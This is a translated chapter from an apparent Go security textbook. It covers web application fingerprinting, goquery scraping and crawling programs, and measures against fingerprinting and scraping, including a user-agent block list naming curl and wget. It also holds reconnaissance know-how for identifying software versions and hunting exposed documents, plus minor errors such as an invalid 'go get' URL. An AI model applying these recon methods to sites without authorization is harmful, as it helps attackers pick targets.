以下是一些关键字，可以帮助您确定正在使用哪种 Web 服务器。这绝不是一个详尽的列表，但涵盖了几个关键字，如果您在互联网上搜索，将会产生结果：

+   `Apache`

+   `Nginx`

+   `Microsoft-IIS`

+   `Tomcat`

+   `WEBrick`

+   `Lighttpd`

+   `IBM HTTP Server`

确定正在使用的编程语言可以在攻击选择上产生很大的影响。像 PHP 这样的脚本语言对不同的东西都是脆弱的，与 Java 服务器或 ASP.NET 应用程序不同。以下是一些示例关键字，您可以使用它们在 HTTP 头中搜索，以确定哪种语言支持应用程序：

+   `Python`

+   `Ruby`

+   `Perl`

+   `PHP`

+   `ASP.NET`

会话 cookie 也是确定使用的框架或语言的重要线索。例如，`PHPSESSID`表示 PHP，`JSESSIONID`表示 Java。以下是一些会话 cookie，您可以搜索：

+   `PHPSESSID`

+   `JSESSIONID`

+   `session`

+   `sessionid`

+   `CFID/CFTOKEN`

+   `ASP.NET_SessionId`

# 指纹识别 Web 应用程序

一般来说，指纹识别 Web 应用程序涵盖的范围要比仅查看 HTTP 头部要广泛得多。您可以在 HTTP 头部中进行基本的关键字搜索，就像刚才讨论的那样，并且可以学到很多，但是在 HTML 源代码和服务器上的其他文件的内容或简单存在中也有大量信息。

在 HTML 源代码中，你可以寻找一些线索，比如页面本身的结构以及 HTML 元素的类和 ID 的名称。AngularJS 应用程序具有独特的 HTML 属性，比如`ng-app`，可以用作指纹识别的关键词。Angular 通常也包含在`script`标签中，就像其他框架如 jQuery 一样。`script`标签也可以被检查以寻找其他线索。寻找诸如 Google Analytics、AdSense、Yahoo 广告、Facebook、Disqus、Twitter 和其他第三方嵌入的 JavaScript 等内容。

仅仅通过 URL 中的文件扩展名就可以告诉你正在使用的是什么语言。例如，`.php`、`.jsp`和`.asp`分别表示正在使用 PHP、Java 和 ASP。

我们还研究了一个在网页中查找 HTML 注释的程序。一些框架和 CMS 会留下可识别的页脚或隐藏的 HTML 注释。有时标记以小图片的形式出现。

目录结构也可以是另一个线索。首先需要熟悉不同的框架。例如，Drupal 将站点信息存储在一个名为`/sites/default`的目录中。如果你尝试访问该 URL，并且收到 403 FORBIDDEN 的响应而不是 404 NOT FOUND 错误，那么你很可能找到了一个基于 Drupal 的网站。

寻找诸如`wp-cron.php`之类的文件。在*在 Web 服务器上查找未列出的文件*部分，我们研究了使用 DirBuster 克隆来查找未列出的文件。找到一组可以用来指纹识别 Web 应用程序的唯一文件，并将它们添加到你的单词列表中。你可以通过检查不同 Web 框架的代码库来确定要查找哪些文件。例如，WordPress 和 Drupal 的源代码是公开可用的。使用本章早些时候讨论的用于查找未列出文件的程序来搜索文件。你还可以搜索与文档相关的其他未列出的文件，比如`CHANGELOG.txt`、`readme.txt`、`readme.md`、`readme.html`、`LICENSE.txt`、`install.txt`或`install.php`。

通过指纹识别正在运行的应用程序的版本，可以更详细地了解 Web 应用程序。如果你可以访问源代码，这将更容易。我将以 WordPress 为例，因为它是如此普遍，并且源代码可以在 GitHub 上找到[`github.com/WordPress/WordPress`](https://github.com/WordPress/WordPress)。

目标是找出版本之间的差异。WordPress 是一个很好的例子，因为它们都带有包含所有管理界面的`/wp-admin/`目录。在`/wp-admin/`目录中，有`css`和`js`文件夹，分别包含样式表和脚本。当网站托管在服务器上时，这些文件是公开可访问的。对这些文件夹使用`diff`命令，以确定哪些版本引入了新文件，哪些版本删除了文件，哪些版本修改了现有文件。将所有这些信息结合起来，通常可以将应用程序缩小到特定版本，或者至少缩小到一小范围的版本。

举个假设的例子，假设版本 1.0 只包含一个文件：`main.js`。版本 1.1 引入了第二个文件：`utility.js`。版本 1.3 删除了这两个文件，并用一个文件`master.js`替换了它们。你可以向 Web 服务器发出 HTTP 请求获取这三个文件：`main.js`、`utility.js`和`master.js`。根据哪些文件返回 200 OK 错误，哪些文件返回 404 NOT FOUND 错误，你可以确定正在运行的是哪个版本。

如果相同的文件存在于多个版本中，你可以深入检查文件的内容。可以进行逐字节比较或对文件进行哈希处理并比较校验和。哈希处理和哈希处理的示例在第六章 *密码学*中有介绍。

有时，识别版本可能比刚才描述的整个过程简单得多。有时会有一个`CHANGELOG.txt`或`readme.html`文件，它会告诉您确切地运行的是哪个版本，而无需做任何工作。

# 如何防止您的应用程序被指纹识别

正如前面所示，有多种方法可以在技术堆栈的许多不同级别上对应用程序进行指纹识别。您真正应该问自己的第一个问题是，“我需要防止指纹识别吗？”一般来说，试图防止指纹识别是一种混淆形式。混淆有点具有争议性，但我认为每个人都同意混淆不是加密的安全性。它可能会暂时减慢、限制信息或使攻击者困惑，但它并不能真正防止利用任何漏洞。现在，我并不是说混淆根本没有好处，但它永远不能单独依赖。混淆只是一层薄薄的掩饰。

显然，您不希望透露太多关于您的应用程序的信息，比如调试输出或配置设置，但无论如何，当服务在网络上可用时，一些信息都将可用。您将不得不在隐藏信息方面做出选择，需要投入多少时间和精力。

有些人甚至会输出错误信息来误导攻击者。就我个人而言，在加固服务器时，输出虚假标头并不在我的清单上。我建议您做的一件事是在部署之前删除任何额外的文件，就像之前提到的那样。在部署之前，应删除诸如更改日志文件、默认设置文件、安装文件和文档文件等文件。不要公开提供不需要应用程序工作的文件。

混淆是一个值得单独章节甚至单独一本书的话题。有一些专门颁发最有创意和奇异的混淆形式的混淆竞赛。有一些工具可以帮助您混淆 JavaScript 代码，但另一方面也有反混淆工具。

# 使用 goquery 包进行网络抓取

`goquery`包不是标准库的一部分，但可以在 GitHub 上找到。它旨在与 jQuery 类似——这是一个用于与 HTML DOM 交互的流行 JavaScript 框架。正如前面所示，尝试使用字符串匹配和正则表达式进行搜索既繁琐又复杂。`goquery`包使得处理 HTML 内容和搜索特定元素变得更加容易。我建议这个包的原因是它是基于非常流行的 jQuery 框架建模的，许多人已经熟悉它。

您可以使用`go get`命令获取`goquery`包：

```go
go get https://github.com/PuerkitoBio/goquery  
```

文档可在[`godoc.org/github.com/PuerkitoBio/goquery`](https://godoc.org/github.com/PuerkitoBio/goquery)找到。

# 列出页面中的所有超链接

在介绍`goquery`包时，我们将看一个常见且简单的任务。我们将找到页面中的所有超链接并将它们打印出来。典型的链接看起来像这样：

```go
<a href="https://www.devdungeon.com">DevDungeon</a>  
```

在 HTML 中，`a`标签代表**锚点**，`href`属性代表**超链接引用**。可能会有一个没有`href`属性但只有`name`属性的锚标签。这些被称为书签，或命名锚点，用于跳转到同一页面上的位置。我们将忽略这些，因为它们只在同一页面内链接。`target`属性只是一个可选项，用于指定在哪个窗口或选项卡中打开链接。在这个例子中，我们只对`href`值感兴趣：

```go
// Load a URL and list all links found
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "os"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Find all links in a web page")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Extract all links
   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      log.Fatal("Error loading HTTP response body. ", err)
   }

   // Find and print all links
   doc.Find("a").Each(func(i int, s *goquery.Selection) {
      href, exists := s.Attr("href")
      if exists {
         fmt.Println(href)
      }
   })
} 
```

# 在网页中查找文档

文档也是感兴趣的点。您可能希望抓取一个网页并查找文档。文字处理器文档、电子表格、幻灯片演示文稿、CSV、文本和其他文件可能包含各种目的的有用信息。

以下示例将通过 URL 搜索并根据链接中的文件扩展名搜索文档。在顶部定义了一个全局变量，方便列出应搜索的所有扩展名。自定义要搜索的扩展名列表以搜索目标文件类型。考虑扩展应用程序以从文件中获取文件扩展名列表，而不是硬编码。在尝试查找敏感信息时，您会寻找哪些其他文件扩展名？

以下是此示例的代码实现：

```go
// Load a URL and list all documents 
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "os"
   "strings"
)

var documentExtensions = []string{"doc", "docx", "pdf", "csv", 
   "xls", "xlsx", "zip", "gz", "tar"}

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Find all links in a web page")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Extract all links
   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      log.Fatal("Error loading HTTP response body. ", err)
   }

   // Find and print all links that contain a document
   doc.Find("a").Each(func(i int, s *goquery.Selection) {
      href, exists := s.Attr("href")
      if exists && linkContainsDocument(href) {
         fmt.Println(href)
      }
   })
} 

func linkContainsDocument(url string) bool {
   // Split URL into pieces
   urlPieces := strings.Split(url, ".")
   if len(urlPieces) < 2 {
      return false
   }

   // Check last item in the split string slice (the extension)
   for _, extension := range documentExtensions {
      if urlPieces[len(urlPieces)-1] == extension {
         return true
      }
   }
   return false
} 
```

# 列出页面标题和标题

标题是定义网页层次结构的主要结构元素，`<h1>`是最高级别，`<h6>`是最低级别。在 HTML 页面的`<title>`标签中定义的标题是显示在浏览器标题栏中的内容，它不是渲染页面的一部分。

通过列出标题和标题，您可以快速了解页面的主题是什么，假设它们正确格式化了他们的 HTML。应该只有一个`<title>`和一个`<h1>`标签，但并非每个人都符合标准。

此程序加载网页，然后将标题和所有标题打印到标准输出。尝试运行此程序针对几个 URL，并查看是否能够通过查看标题快速了解内容：

```go
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "os"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("List all headings (h1-h6) in a web page")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      log.Fatal("Error loading HTTP response body. ", err)
   }

   // Print title before headings
   title := doc.Find("title").Text()
   fmt.Printf("== Title ==\n%s\n", title)

   // Find and list all headings h1-h6
   headingTags := [6]string{"h1", "h2", "h3", "h4", "h5", "h6"}
   for _, headingTag := range headingTags {
      fmt.Printf("== %s ==\n", headingTag)
      doc.Find(headingTag).Each(func(i int, heading *goquery.Selection) {
         fmt.Println(" * " + heading.Text())
      })
   }

} 
```

# 爬取存储最常见单词的站点上的页面

此程序打印出网页上使用的所有单词列表，以及每个单词在页面上出现的次数。这将搜索所有段落标签。如果搜索整个正文，它将将所有 HTML 代码视为单词，这会使数据混乱，并且实际上并不帮助您了解站点的内容。它会修剪字符串中的空格、逗号、句号、制表符和换行符。它还会尝试将所有单词转换为小写以规范化数据。

对于它找到的每个段落，它将拆分文本内容。每个单词存储在将字符串映射到整数计数的映射中。最后，映射被打印出来，列出了每个单词以及在页面上看到了多少次：

```go
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "os"
   "strings"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("List all words by frequency from a web page")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      log.Fatal("Error loading HTTP response body. ", err)
   }

   // Find and list all headings h1-h6
   wordCountMap := make(map[string]int)
   doc.Find("p").Each(func(i int, body *goquery.Selection) {
      fmt.Println(body.Text())
      words := strings.Split(body.Text(), " ")
      for _, word := range words {
         trimmedWord := strings.Trim(word, " \t\n\r,.?!")
         if trimmedWord == "" {
            continue
         }
         wordCountMap[strings.ToLower(trimmedWord)]++

      }
   })

   // Print all words along with the number of times the word was seen
   for word, count := range wordCountMap {
      fmt.Printf("%d | %s\n", count, word)
   }

} 
```

# 在页面中打印外部 JavaScript 文件列表

检查包含在页面上的 JavaScript 文件的 URL 可以帮助您确定应用程序的指纹或确定加载了哪些第三方库。此程序将列出网页中引用的外部 JavaScript 文件。外部 JavaScript 文件可能托管在同一域上，也可能从远程站点加载。它检查所有`script`标签的`src`属性。

例如，如果 HTML 页面具有以下标签：

```go
<script src="img/jquery.min.js"></script>  
```

`src`属性的 URL 将被打印：

```go
/ajax/libs/jquery/3.2.1/jquery.min.js
```

请注意，`src`属性中的 URL 可能是完全限定的或相对 URL。

以下程序加载 URL，然后查找所有`script`标签。它将打印它找到的每个脚本的`src`属性。这将仅查找外部链接的脚本。要打印内联脚本，请参考文件底部关于`script.Text()`的注释。尝试运行此程序针对您经常访问的一些网站，并查看它们嵌入了多少外部和第三方脚本：

```go
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "os"
)

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("List all JavaScript files in a webpage")
      fmt.Println("Usage: " + os.Args[0] + " <url>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   url := os.Args[1]

   // Fetch the URL
   response, err := http.Get(url)
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      log.Fatal("Error loading HTTP response body. ", err)
   }

   // Find and list all external scripts in page
   fmt.Println("Scripts found in", url)
   fmt.Println("==========================")
   doc.Find("script").Each(func(i int, script *goquery.Selection) {

      // By looking only at the script src we are limiting
      // the search to only externally loaded JavaScript files.
      // External files might be hosted on the same domain
      // or hosted remotely
      src, exists := script.Attr("src")
      if exists {
         fmt.Println(src)
      }

      // script.Text() will contain the raw script text
      // if the JavaScript code is written directly in the
      // HTML source instead of loaded from a separate file
   })
} 
```

此示例查找由`src`属性引用的外部脚本，但有些脚本直接在 HTML 中的开放和关闭`script`标签之间编写。这些类型的内联脚本不会有引用`src`属性。使用`goquery`对象上的`.Text()`函数获取内联脚本文本。请参考此示例底部，其中提到了`script.Text()`。

这个程序不打印内联脚本，而是只关注外部加载的脚本，因为那是引入许多漏洞的地方。加载远程 JavaScript 是有风险的，应该只能使用受信任的来源。即使如此，我们也不能百分之百保证远程内容提供者永远不会被入侵并提供恶意代码。考虑雅虎这样的大公司，他们公开承认他们的系统过去曾受到入侵。雅虎还有一个托管**内容传送网络**（**CDN**）的广告网络，为大量网站提供 JavaScript 文件。这将是攻击者的主要目标。在包含远程 JavaScript 文件时，请考虑这些风险。

# 深度优先爬行

深度优先爬行是指优先考虑相同域上的链接，而不是指向其他域的链接。在这个程序中，外部链接完全被忽略，只有相同域上的路径或相对链接被跟踪。

在这个例子中，唯一的路径被存储在一个切片中，并在最后一起打印出来。在爬行过程中遇到的任何错误都会被忽略。由于链接格式不正确，经常会遇到错误，我们不希望整个程序在这样的错误上退出。

不要试图使用字符串函数手动解析 URL，而是利用`url.Parse()`函数。它会将主机与路径分开。

在爬行时，忽略任何查询字符串和片段以减少重复。查询字符串在 URL 中用问号标记，片段，也称为书签，用井号标记。这个程序是单线程的，不使用 goroutines：

```go
// Crawl a website, depth-first, listing all unique paths found
package main

import (
   "fmt"
   "github.com/PuerkitoBio/goquery"
   "log"
   "net/http"
   "net/url"
   "os"
   "time"
)

var (
   foundPaths  []string
   startingUrl *url.URL
   timeout     = time.Duration(8 * time.Second)
)

func crawlUrl(path string) {
   // Create a temporary URL object for this request
   var targetUrl url.URL
   targetUrl.Scheme = startingUrl.Scheme
   targetUrl.Host = startingUrl.Host
   targetUrl.Path = path

   // Fetch the URL with a timeout and parse to goquery doc
   httpClient := http.Client{Timeout: timeout}
   response, err := httpClient.Get(targetUrl.String())
   if err != nil {
      return
   }
   doc, err := goquery.NewDocumentFromReader(response.Body)
   if err != nil {
      return
   }

   // Find all links and crawl if new path on same host
   doc.Find("a").Each(func(i int, s *goquery.Selection) {
      href, exists := s.Attr("href")
      if !exists {
         return
      }

      parsedUrl, err := url.Parse(href)
      if err != nil { // Err parsing URL. Ignore
         return
      }

      if urlIsInScope(parsedUrl) {
         foundPaths = append(foundPaths, parsedUrl.Path)
         log.Println("Found new path to crawl: " +
            parsedUrl.String())
         crawlUrl(parsedUrl.Path)
      }
   })
}

// Determine if path has already been found
// and if it points to the same host
func urlIsInScope(tempUrl *url.URL) bool {
   // Relative url, same host
   if tempUrl.Host != "" && tempUrl.Host != startingUrl.Host {
      return false // Link points to different host
   }

   if tempUrl.Path == "" {
      return false
   }

   // Already found?
   for _, existingPath := range foundPaths {
      if existingPath == tempUrl.Path {
         return false // Match
      }
   }
   return true // No match found
}

func main() {
   // Load command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Crawl a website, depth-first")
      fmt.Println("Usage: " + os.Args[0] + " <startingUrl>")
      fmt.Println("Example: " + os.Args[0] + 
         " https://www.devdungeon.com")
      os.Exit(1)
   }
   foundPaths = make([]string, 0)

   // Parse starting URL
   startingUrl, err := url.Parse(os.Args[1])
   if err != nil {
      log.Fatal("Error parsing starting URL. ", err)
   }
   log.Println("Crawling: " + startingUrl.String())

   crawlUrl(startingUrl.Path)

   for _, path := range foundPaths {
      fmt.Println(path)
   }
   log.Printf("Total unique paths crawled: %d\n", len(foundPaths))
} 
```

# 广度优先爬行

广度优先爬行是指优先考虑查找新域并尽可能扩展，而不是以深度优先的方式继续通过单个域。

编写一个广度优先爬行器将根据本章提供的信息留给读者作为练习。它与上一节的深度优先爬行器并没有太大的不同，只是应该优先考虑指向以前未见过的域的 URL。

有几点需要记住。如果不小心，不设置最大限制，你可能最终会爬行宠字节的数据！你可能选择忽略子域，或者你可以进入一个具有无限子域的站点，你永远不会离开。

# 如何防止网页抓取

要完全防止网页抓取是困难的，甚至是不可能的。如果你从 Web 服务器提供信息，总会有一种方式可以以编程方式提取数据。你只能设置障碍。这相当于混淆，你可以说这不值得努力。

JavaScript 使得这更加困难，但并非不可能，因为 Selenium 可以驱动真实的 Web 浏览器，而像 PhantomJS 这样的框架可以用来执行 JavaScript。

需要身份验证可以帮助限制抓取的数量。速率限制也可以提供一些缓解。可以使用诸如 iptables 之类的工具进行速率限制，也可以在应用程序级别进行，基于 IP 地址或用户会话。

检查客户端提供的用户代理是一个浅显的措施，但可以有所帮助。丢弃带有关键字的用户代理的请求，如`curl`，`wget`，`go`，`python`，`ruby`和`perl`。阻止或忽略这些请求可以防止简单的机器人抓取您的网站，但客户端可以伪造或省略他们的用户代理，以便轻松绕过。

如果你想更进一步，你可以使 HTML 的 ID 和类名动态化，这样它们就不能用来查找特定信息。经常改变你的 HTML 结构和命名，玩起*猫鼠游戏*，让爬虫的工作变得不值得。这并不是一个真正的解决方案，我不建议这样做，但是值得一提，因为这会让爬虫感到恼火。

你可以使用 JavaScript 来检查关于客户端的信息，比如屏幕尺寸，在呈现数据之前。如果屏幕尺寸是 1 x 1 或 0 × 0，或者是一些奇怪的尺寸，你可以假设这是一个机器人，并拒绝呈现内容。

蜜罐表单是检测机器人行为的另一种方法。使用 CSS 或`hidden`属性隐藏表单字段，并检查这些字段是否提供了值。如果这些字段中有数据，就假设是机器人在填写所有字段并忽略该请求。

另一个选择是使用图像来存储信息而不是文本。例如，如果你只输出一个饼图的图像，对于某人来说要爬取数据就会更加困难，而当你将数据输出为 JSON 对象并让 JavaScript 渲染饼图时，情况就不同了。爬虫可以直接获取 JSON 数据。文本也可以放在图像中，以防止文本被爬取和防止关键字文本搜索，但是**光学字符识别**（**OCR**）可以通过一些额外的努力来解决这个问题。

根据应用程序，前面提到的一些技术可能会有用。

# 总结

阅读完本章后，你现在应该了解了网络爬虫的基础知识，比如执行 HTTP `GET`请求和使用字符串匹配或正则表达式查找 HTML 注释、电子邮件和其他关键字。你还应该了解如何提取 HTTP 头并设置自定义头以设置 cookie 和自定义用户代理字符串。此外，你应该了解指纹识别的基本概念，并对如何根据提供的源代码收集有关 Web 应用程序的信息有一些想法。

经过这一章的学习，你应该也了解了使用`goquery`包在 DOM 中以 jQuery 风格查找 HTML 元素的基础知识。你应该能够轻松地在网页中找到链接，找到文档，列出标题和标题，找到 JavaScript 文件，并找到广度优先和深度优先爬取之间的区别。

关于爬取公共网站的一点说明——要尊重。不要通过发送大批量请求或让爬虫不受限制地运行来给网站带来不合理的流量。在你编写的程序中设置合理的速率限制和最大页面计数限制，以免过度拖累远程服务器。如果你是为了获取数据而进行爬取，请始终检查是否有 API 可用。API 更高效，旨在以编程方式使用。

你能想到其他应用本章中所讨论的工具的方式吗？你能想到可以添加到提供的示例中的其他功能吗？

在下一章中，我们将探讨主机发现和枚举的方法。我们将涵盖诸如 TCP 套接字、代理、端口扫描、横幅抓取和模糊测试等内容。
